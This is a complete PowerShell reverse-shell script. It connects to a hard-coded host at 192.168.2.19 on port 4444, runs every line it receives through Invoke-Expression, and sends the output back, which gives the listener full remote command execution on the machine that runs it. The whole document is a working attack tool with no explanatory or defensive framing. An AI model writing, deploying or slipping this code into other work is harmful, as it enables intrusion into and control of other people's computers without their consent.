# reverse-shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("192.168.2.19", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.AsciiEncoding

$writer.Write([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("U3RhdHR1cwo=")))  # Just to signify the start of the session
$writer.Flush()

while ($true) {
    $writer.Flush()
    $read = $null
    $pos = 0
    
    while ($pos -lt $buffer.Length -and ($read = $stream.Read($buffer, $pos, $buffer.Length - $pos)) -gt 0) {
        $pos += $read
        if ($buffer[($pos - 1)] -eq 10) { break }
    }
    
    $line = $encoding.GetString($buffer, 0, $pos - 1)
    
    try {
        $output = Invoke-Expression -Command $line 2>&1 | Out-String
    }
    catch {
        $output = $_.Exception.ToString()
    }
    
    $writer.Write($output)
    $writer.Flush()
}
